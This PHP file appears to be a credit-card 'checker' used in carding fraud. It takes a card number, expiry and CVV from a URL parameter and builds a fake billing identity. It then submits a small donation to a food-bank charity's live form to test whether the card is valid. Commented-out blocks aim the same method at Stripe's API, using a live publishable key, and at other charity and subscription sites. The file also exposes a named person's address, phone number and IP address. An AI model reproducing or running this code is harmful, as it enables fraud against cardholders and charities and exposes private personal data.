<?php
set_time_limit(0);

if ($_SERVER["REQUEST_METHOD"] == "GET") {

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}
$card = $_GET['cc'];
$is = $_GET['is'];
 

$cc = multiexplode(array(":", "|", ""), $card)[0];
$mes = multiexplode(array(":", "|", ""), $card)[1];
$ano = multiexplode(array(":", "|", ""), $card)[2];
$cvv = multiexplode(array(":", "|", ""), $card)[3];

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[2]);
    return $str[0];
}


$state_list = array('AL'=>"Alabama",  
    'AK'=>"Alaska",  
    'AZ'=>"Arizona",  
    'AR'=>"Arkansas",  
    'CA'=>"California",  
    'CO'=>"Colorado",  
    'CT'=>"Connecticut",  
    'DE'=>"Delaware",  
    'DC'=>"District Of Columbia",  
    'FL'=>"Florida",  
    'GA'=>"Georgia",  
    'HI'=>"Hawaii",  
    'ID'=>"Idaho",  
    'IL'=>"Illinois",  
    'IN'=>"Indiana",  
    'IA'=>"Iowa",  
    'KS'=>"Kansas",  
    'KY'=>"Kentucky",  
    'LA'=>"Louisiana",  
    'ME'=>"Maine",  
    'MD'=>"Maryland",  
    'MA'=>"Massachusetts",  
    'MI'=>"Michigan",  
    'MN'=>"Minnesota",  
    'MS'=>"Mississippi",  
    'MO'=>"Missouri",  
    'MT'=>"Montana",
    'NE'=>"Nebraska",
    'NV'=>"Nevada",
    'NH'=>"New Hampshire",
    'NJ'=>"New Jersey",
    'NM'=>"New Mexico",
    'NY'=>"New York",
    'NC'=>"North Carolina",
    'ND'=>"North Dakota",
    'OH'=>"Ohio",  
    'OK'=>"Oklahoma",  
    'OR'=>"Oregon",  
    'PA'=>"Pennsylvania",  
    'RI'=>"Rhode Island",  
    'SC'=>"South Carolina",  
    'SD'=>"South Dakota",
    'TN'=>"Tennessee",  
    'TX'=>"Texas",  
    'UT'=>"Utah",  
    'VT'=>"Vermont",  
    'VA'=>"Virginia",  
    'WA'=>"Washington",  
    'WV'=>"West Virginia",  
    'WI'=>"Wisconsin",  
    'WY'=>"Wyoming");

$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
$user = json_decode(curl_exec($ch1), JSON_PRETTY_PRINT); 

$first = isset($user["results"][0]["name"]["first"]) ? $user["results"][0]["name"]["first"] : "karim" ;
$last = isset($user["results"][0]["name"]["last"]) ? $user["results"][0]["name"]["last"] : "mansour" ;
$email = isset($user["results"][0]["email"]) ? $user["results"][0]["email"] : "karimmansour77@gmail.com" ;

$number = isset($user["results"][0]["location"]["street"]["number"]) ? $user["results"][0]["location"]["street"]["number"] : "327" ;
$name = isset($user["results"][0]["location"]["street"]["name"]) ? $user["results"][0]["location"]["street"]["name"] : "Timber Wolf Trail" ;
$address = $number ." ". $name ;

$postcode = isset($user["results"][0]["location"]["postcode"]) ? $user["results"][0]["location"]["postcode"] : 70887 ;
$city = isset($user["results"][0]["location"]["city"]) ? $user["results"][0]["location"]["city"] : "Fresno" ;
$state = isset($user["results"][0]["location"]["state"]) ? array_search($user["results"][0]["location"]["state"], $state_list) : "Or" ;
$country = isset($user["results"][0]["location"]["country"]) ? $user["results"][0]["location"]["country"] : "United States" ;




// $query = array(
//     "type" =>  "card" ,
//     "card[number]" =>  $cc ,
//     "card[cvc]" =>  $cvv ,
//     "card[exp_month]" =>  $mes ,
//     "card[exp_year]" =>  $ano ,
//     "guid" => "NA" ,
//     "muid" => "NA" ,
//     "sid" => "NA" ,
//     "pasted_fields" =>  "number" ,
//     "payment_user_agent" =>  "stripe.js/05b24d115; stripe-js-v3/05b24d115" ,
//     "time_on_page" => "415048" ,
//     "referrer" => "https://support.eji.org/", 
//      "key" => "pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz"
  
// );
// $headers = array('accept: application/json' ,
// "origin: https://www.canadahelps.org" ,
// "referer: https://www.canadahelps.org/",
// 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"v"' ,
// "sec-ch-ua-mobile: ?0" ,
// "Sec-Fetch-Dest: empty" ,
// "Sec-Fetch-Mode: cors" ,
// "Sec-Fetch-Site: same-origin",
// "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36");
// header('Access-Control-Allow-Origin: *');


$ch2 = curl_init();
//curl_setopt($ch2, CURLOPT_URL, "http://ip-api.com/json/");
curl_setopt($ch2, CURLOPT_URL, "https://secure.feedingamerica.org/site/Donation2");
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//curl_setopt($ch2, CURLINFO_HEADER_OUT, true);
//curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch2, CURLOPT_POSTFIELDS, "user_donation_amt=%245.00&company_min_matching_amt=&currency_locale=en_US&variationhidden=&referrerhidden=&onsite_promohidden=MainNav_Donate&keywordhidden=&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpanded=40368&level_standardexpanded40368amount=%245&level_standardexpandedsubmit=true&level_standardsubmit=true&level_standardauto_repeatsubmit=true&responsive_payment_typepay_typeradio=credit&responsive_payment_typepay_typeradiosubmit=true&responsive_payment_typesubmit=true&billing_first_namename={$first}&billing_first_namesubmit=true&billing_last_namename={$last}&billing_last_namesubmit=true&billing_addr_street1name={$address}&billing_addr_street1submit=true&billing_addr_street2name=&billing_addr_street2submit=true&billing_addr_cityname={$city}&billing_addr_citysubmit=true&billing_addr_state={$state}&billing_addr_statesubmit=true&billing_addr_zipname={$postcode}&billing_addr_zipsubmit=true&billing_addr_country={$country}&billing_addr_countrysubmit=true&donor_email_addressname={$email}&donor_email_addresssubmit=true&gift_on_behalf_of_companysubmit=true&company_or_organization_name_input=&company_or_organization_namesubmit=true&gift-ref=&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername={$cc}&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH={$mes}&responsive_payment_typecc_exp_date_YEAR={$ano}&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname={$cvv}&responsive_payment_typecc_cvvsubmit=true&idb=57664980&df_id=25431&mfc_pref=T&browser_input=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F90.0.4430.212+Safari%2F537.36&browsersubmit=true&lightbox_choicehidden=nolightbox-onetime&paypal_transactionidhidden=&paypal_billingplanidhidden=&paypalxc_initialsustaininghidden=&25431.donation=form1&pstep_finish=Submit");
// curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
// curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
//curl_setopt($ch2, CURLOPT_VERBOSE, 1);

$result2 = curl_exec($ch2);


if(curl_error($ch2))
{
    $status = "failed" ;
    $data = curl_error($ch2) ;
}
else {      
    // if($result2 != null && $result2 != "" && substr($result2 , 0 , 1) == "{"){
      if($result2 != null && $result2 != ""){
           //$msg =  getStr($result2, '<span class="field-error-text">', '</span>' );

            $status = "success" ;
            $data = $result2 ;

        }else {
            $status = "failed" ;
            $data = "nothing" ;
        }

}

echo json_encode(array("status" => $status , "data" => $data) , JSON_UNESCAPED_UNICODE);


// if($is == "yes"){
//     $proxy = $_POST['proxy'];
//     $type = $_POST["type"] ;
//     $proxy = trim($_POST['proxy']) ;

//     curl_setopt($ch, CURLOPT_PROXY,$proxy);
//     curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
//     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

//     if($type == "HTTP") curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//     if($type == "HTTPS") curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
//     if($type == "SOCKS4") curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
//     if($type == "SOCKS5") curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

// }











// if(curl_error($ch2))
// {
//     echo curl_error($ch2) ;
// }
// // curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $header) {
// //     var_dump($header);
// // });
// // Then, after your curl_exec call:
// // $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
// // $header = substr($result, 0, $header_size);
// // $body = substr($result, $header_size);

// // //echo "result" . "<br>";

//echo $result2 . "<br>";
//  echo $header . "<br>";
// $token =  getStr($result2, '<meta content="authenticity_token" name="csrf-param" />', 'name="csrf-token" />' );
// $session =  getStr($result2, '_session=', ';' );

// echo $session . "<br>";

// // list($headers, $content) = explode("\r\n\r\n",$result,2);

// // // Print header
// // foreach (explode("\r\n",$headers) as $hdr)
// //     printf('<p>Header: %s</p>', $hdr);

// // // Print Content
// // echo $content;
// // multi-cookie variant contributed by @Combuster in comments
// // preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
// // $cookies = array();
// // foreach($matches[1] as $item) {
// //     parse_str($item, $cookie);
// //     $cookies = array_merge($cookies, $cookie);
// // }
// // var_dump($cookies);

// $headers3 = array("Accept: */*" ,
// "Accept-Language: en-US,en;q=0.9,ar;q=0.8" ,
// "Connection: keep-alive" ,
// "Content-Type: application/json" ,
// "Cookie: locale_det=en; _session={$session}" ,
// "Host: saltiyogaonline.vhx.tv" ,
// "Origin: https://saltiyogaonline.vhx.tv" ,
// "Referer: https://saltiyogaonline.vhx.tv/checkout/subscribe/purchase" ,
// 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"v"' ,
// "sec-ch-ua-mobile: ?0" ,
// "Sec-Fetch-Dest: empty" ,
// "Sec-Fetch-Mode: cors" ,
// "Sec-Fetch-Site: same-origin" ,
// "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" ,
// "X-CSRF-Token: {$token}" ,
// "X-Requested-With: XMLHttpRequest");



// $ch3 = curl_init();
// curl_setopt($ch3, CURLOPT_URL, "https://saltiyogaonline.vhx.tv/registration.json");
// curl_setopt($ch3, CURLOPT_HEADER, 0);
// curl_setopt($ch3, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// // curl_setopt($ch3, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
// // curl_setopt($ch3, CURLOPT_SSL_VERIFYPEER, 0);
// // curl_setopt($ch3, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch3, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
// curl_setopt($ch3, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers3);
// curl_setopt($ch3, CURLOPT_POST, 1);
// curl_setopt($ch3, CURLOPT_POSTFIELDS, '{"email": "'.$email.'","name":"'.$first . " " . $last .'","password":"'.$first . "98".'","marketing_opt_in":true,"is_avod_registration":false,"send_email":0,"product_sku":"salti-yoga-online-subscription","product_type":"monthly","v2_checkout":true}');

// $result3 = curl_exec($ch3);



// $headers4 = array(
//     'authority: api.stripe.com',
//     'method: POST',
//     'path: path: /v1/sources',
//     'scheme: https',
//     'accept: application/json',
//     'content-type: application/x-www-form-urlencoded',
//     'origin: https://js.stripe.com',
//     'referer: https://js.stripe.com/',
//     'sec-fetch-mode: cors');

// $query4 = array(
// "type" =>  "card" ,
// "billing_details[name]" =>  $first . " " . $last ,
// "billing_details[address][postal_code]" => $postcode ,
// "card[number]" =>  $cc ,
// "card[cvc]" =>  $cvv ,
// "card[exp_month]" =>  $mes ,
// "card[exp_year]" =>  $ano ,
// "guid" => "NA" ,
// "muid" => "NA" ,
// "sid" => "NA" ,
// "pasted_fields" =>  "number" ,
// "payment_user_agent" =>  "stripe.js/05b24d115; stripe-js-v3/05b24d115" ,
// "time_on_page" => "415048" ,
// "referrer" => "https://support.eji.org/", 
//  "key" => "pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz"

// );
// $ch4 = curl_init();
// curl_setopt($ch4, CURLOPT_URL, "https://api.stripe.com/v1/payment_methods");
// curl_setopt($ch4, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch4, CURLOPT_HEADER, 0);
// curl_setopt($ch4, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch4, CURLINFO_HEADER_OUT, true);
// curl_setopt($ch4, CURLOPT_HTTPHEADER, $headers4);
// curl_setopt($ch4, CURLOPT_POST, 1);
// curl_setopt($ch4, CURLOPT_POSTFIELDS, http_build_query($query4));
// //curl_setopt($ch4, CURLOPT_POSTFIELDS, '');
// // curl_setopt($ch4, CURLOPT_SSL_VERIFYPEER, 0);
// // curl_setopt($ch4, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch4, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
// curl_setopt($ch4, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
// //curl_setopt($ch4, CURLOPT_VERBOSE, 1);
// $result4 = curl_exec($ch4);
// $id =  getStr($result2, '"id": "', '"' );
// $id2 =  getStr2($result2, '"id": "', '"' );






// $headers5 = array("Accept: */*" ,
// "Content-Type: application/json");


// $ch5 = curl_init();
// curl_setopt($ch5, CURLOPT_URL, "https://www.scope.org.uk/api/sitecore/donationstripe/createpayment");
// curl_setopt($ch5, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch5, CURLOPT_HEADER, 0);
// curl_setopt($ch5, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch5, CURLINFO_HEADER_OUT, true);
// curl_setopt($ch5, CURLOPT_HTTPHEADER, $headers5);
// curl_setopt($ch5, CURLOPT_POST, 1);
// curl_setopt($ch5, CURLOPT_POSTFIELDS, '{"recurring":false,"amount":1,"firstName":"Karim","lastName":"Mansour","email":"don.karimmansour@aol.com","phone":"0658982795","giftAid":false,"legacy":"false","legacyDetail":"","fundraising":"false","fundraisingType":"","fundraisingDetail":"","newsletter":{"post":false,"phone":false,"email":false,"text":false},"return":"839cb9c4-87a1-46e6-9b57-b5f5d6b66261","costCentreCode":"","token":{"id":"'."zzzzzzzzzzzzzzzz".'","object":"token","card":{"id":"'."zzzzzzzz".'","object":"card","address_city":"sale","address_country":"MA","address_line1":"29 rue sidi larbi ben sayeh hay baraka kom sale","address_line1_check":"unchecked","address_line2":"","address_state":null,"address_zip":"11000","address_zip_check":"unchecked","brand":"Visa","country":"SA","cvc_check":"unchecked","dynamic_last4":null,"exp_month":12,"exp_year":2022,"funding":"prepaid","last4":"0430","name":"Karim  Mansour","tokenization_method":null},"client_ip":"194.59.249.247","created":1621445480,"livemode":true,"type":"card","used":false}}');
// //curl_setopt($ch5, CURLOPT_POSTFIELDS, '{"recurring":false,"amount":1,"firstName":"Karim","lastName":"Mansour","email":"don.karimmansour@aol.com","phone":"0658982795","giftAid":false,"legacy":"false","legacyDetail":"","fundraising":"false","fundraisingType":"","fundraisingDetail":"","newsletter":{"post":false,"phone":false,"email":false,"text":false},"return":"839cb9c4-87a1-46e6-9b57-b5f5d6b66261","costCentreCode":"","token":{"id":"'.$id.'","object":"token","card":{"id":"'.$id2.'","object":"card","address_city":"sale","address_country":"MA","address_line1":"29 rue sidi larbi ben sayeh hay baraka kom sale","address_line1_check":"unchecked","address_line2":"","address_state":null,"address_zip":"11000","address_zip_check":"unchecked","brand":"Visa","country":"SA","cvc_check":"unchecked","dynamic_last4":null,"exp_month":12,"exp_year":2022,"funding":"prepaid","last4":"0430","name":"Karim  Mansour","tokenization_method":null},"client_ip":"194.59.249.247","created":1621445480,"livemode":true,"type":"card","used":false}}');
// // curl_setopt($ch5, CURLOPT_SSL_VERIFYPEER, 0);
// // curl_setopt($ch5, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch5, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
// curl_setopt($ch5, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
// //curl_setopt($ch5, CURLOPT_VERBOSE, 1);
// $result5 = curl_exec($ch5);

// echo $result5 ;






























// // $bin = getBin(substr($cc, 0, 6));




 }